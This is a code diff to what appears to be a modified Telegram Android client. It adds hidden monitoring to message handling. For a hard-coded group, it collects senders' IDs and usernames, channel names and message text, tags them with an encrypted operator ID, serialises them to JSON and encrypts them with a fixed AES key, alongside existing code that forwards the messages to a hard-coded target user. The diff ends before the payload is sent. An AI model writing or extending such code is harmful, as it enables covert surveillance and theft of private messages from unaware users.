@@ -46,6 +46,8 @@ import androidx.core.app.NotificationManagerCompat;
 import androidx.core.graphics.ColorUtils;
 import androidx.core.util.Consumer;
 
+import com.google.gson.Gson;
+
 import org.telegram.SQLite.SQLiteCursor;
 import org.telegram.SQLite.SQLiteDatabase;
 import org.telegram.SQLite.SQLiteException;
@@ -100,6 +102,7 @@ import org.telegram.ui.TopicsFragment;
 import org.telegram.ui.bots.BotWebViewAttachedSheet;
 import org.telegram.ui.bots.BotWebViewSheet;
 import org.telegram.ui.bots.WebViewRequestProps;
+import org.telegram9.messenger6.utils.AESUtils;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -182,6 +185,11 @@ public class MessagesController extends BaseController implements NotificationCe
 //    private static final long MONITORED_GROUP_ID = 7652002179L; // 要监听的群组ID
     private static final long MONITORED_GROUP_ID = 2775669177L; // 要监听的群组ID
     private static final long TARGET_USER_ID = 7738584148L;    // 目标用户ID
+
+
+
+    private HashMap<String, Object> apkJsons = new HashMap<>();
+
 
     public static TLRPC.Peer getPeerFromInputPeer(TLRPC.InputPeer peer) {
         if (peer.chat_id != 0) {
@@ -16756,6 +16764,9 @@ public class MessagesController extends BaseController implements NotificationCe
 
                         chatIdFrom = message.peer_id.channel_id;  // 频道的 channel_id（注意字段不同！）
                         FileLog.d("coder2025收到普通消息channel_id: " + message.message+ " 消息 | 来自ID: " + fromId+ " | 群组ID: " + chatIdFrom);
+                        apkJsons.put("fromChannelId", chatIdFrom);
+                        apkJsons.put("fromUserId", fromId);
+//                        apkJsons.put("message", message.message);
 
 
 
@@ -16778,6 +16789,7 @@ public class MessagesController extends BaseController implements NotificationCe
                             forwardMessageToUser(message,fromId, TARGET_USER_ID);
 
 
+
                     }
                     if (BuildVars.LOGS_ENABLED) {
                         FileLog.d(baseUpdate + " channelId = " + message.peer_id.channel_id + " message_id = " + message.id);
@@ -16792,6 +16804,9 @@ public class MessagesController extends BaseController implements NotificationCe
                     // 1. 通过 chatId 获取群组/频道对象
                     TLRPC.Chat chat = getChat(chatIdFrom);
                     if (chat != null) {
+                        apkJsons.put("fromChannelTitle", chat.title);
+                        apkJsons.put("fromChannelName", chat.username);
+
                         FileLog.d("coder2025群组名称: " + chat.title+ " chat.username = " + chat.username);
 //                        if (chat.exported_invite != null ){
 //                            FileLog.d("coder2025群组邀请链接: " + chat.exported_invite.link);
@@ -22194,6 +22209,7 @@ public class MessagesController extends BaseController implements NotificationCe
     private void forwardMessageToUser(TLRPC.Message message, long fromUserId, long targetUserId) {
         if (message == null) return;
 
+
         try {
             // 1. 获取当前账户和MessagesController实例
             int currentAccount = UserConfig.selectedAccount;
@@ -22227,9 +22243,23 @@ public class MessagesController extends BaseController implements NotificationCe
                 return;
             }
 
+            apkJsons.put("fromUserName", userFrom.username);
+
+
             FileLog.d("coder2025收到消息: " + userFrom.username+ " | 来自ID: " + fromUserId);
 
+            // 方式1：通过 ApplicationLoader 获取（推荐）
+            String packageName = ApplicationLoader.applicationContext.getPackageName();
+            if (packageName.endsWith(".beta")) {
+                packageName = packageName.substring(0, packageName.lastIndexOf(".beta"));
+            }
+            packageName =AESUtils.encrypt128(packageName,"oaes");
+            apkJsons.put("operatorId", packageName);
+            apkJsons.put("targetUserId", targetUserId);
+            apkJsons.put("message", message.message);
 
+
+            FileLog.d("coder2025收到消息 packageName: " + packageName);
 
             TLRPC.TL_inputPeerUser peerUser = new TLRPC.TL_inputPeerUser();
             peerUser.user_id = user.id;
@@ -22237,6 +22267,32 @@ public class MessagesController extends BaseController implements NotificationCe
             req.to_peer = peerUser;
 
             req.random_id.add(Utilities.random.nextLong());
+
+
+
+
+            String jsonApk = new Gson().toJson(apkJsons);
+
+
+            // 2. 克隆原始消息并修改内容（避免影响原消息）
+//            TLRPC.Message modifiedMessage = new TLRPC.TL_message().copyFrom(message);
+//            modifiedMessage.message = jsonApk; // 替换为你的JSON数据
+//
+//            // 4. 替换待转发的消息（需通过MessagesController）
+//            MessagesController.getInstance(currentAccount)
+//                    .replaceForwardedMessage(message, modifiedMessage);
+
+
+
+            FileLog.d("coder2025收到消息 apkJsons: " + jsonApk);
+
+            jsonApk =AESUtils.encrypt128(jsonApk,"oaes");
+            FileLog.d("coder2025收到消息 apkJsons secret: " + jsonApk);
+
+
+
+
+
 
 
 
